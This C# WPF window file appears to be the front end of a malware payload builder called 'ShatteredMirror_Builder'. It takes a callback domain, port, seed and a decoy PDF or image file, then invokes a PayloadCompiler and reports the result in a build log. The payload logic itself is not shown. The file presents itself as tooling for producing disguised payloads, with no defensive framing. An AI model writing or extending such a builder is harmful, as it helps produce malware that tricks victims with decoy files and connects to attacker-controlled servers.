using System;
using System.Windows;
using Microsoft.Win32;
using System.Threading.Tasks;

namespace ShatteredMirror_Builder
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private async void BtnGenerate_Click(object sender, RoutedEventArgs e)
        {
            // Simulate the build process
            btnGenerate.Content = "COMPILING...";
            btnGenerate.IsEnabled = false;
            txtLogs.Text = "[+] Initializing Build Pipeline...\n";

            try
            {
                // Grab the values from the text boxes
                string domain = txtDomain.Text;
                string port = txtPort.Text;
                string seed = txtSeed.Text;
                string decoyFile = txtDecoy.Text == "Drop or select file..." ? "" : txtDecoy.Text;
                
                // Since dotnet run executes in Builder_GUI, the root is one level up
                PayloadCompiler compiler = new PayloadCompiler("..", ".\\Output", decoyFile, domain, port, seed);
                
                // Use Task.Run to keep the UI thread responsive
                bool success = await Task.Run(() => compiler.BuildPayload());
                
                // Final display of the logs in the UI
                txtLogs.Text = compiler.BuildLogs.ToString();

                if (success)
                {
                    MessageBox.Show("Compilation successful! Output saved in project root.", 
                                    "Success", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                else
                {
                    MessageBox.Show("Compilation failed. Check the Build Logs for errors.", 
                                    "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred:\n{ex.Message}", 
                                "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            finally
            {
                btnGenerate.Content = "COMPILE PAYLOAD";
                btnGenerate.IsEnabled = true;
            }
        }

        private void BtnBrowse_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Select Decoy File (PDF, PNG, JPG)";
            openFileDialog.Filter = "All Files (*.*)|*.*|PDF Documents (*.pdf)|*.pdf|Images (*.png;*.jpg)|*.png;*.jpg";
            
            if (openFileDialog.ShowDialog() == true)
            {
                txtDecoy.Text = openFileDialog.FileName;
            }
        }
    }
}
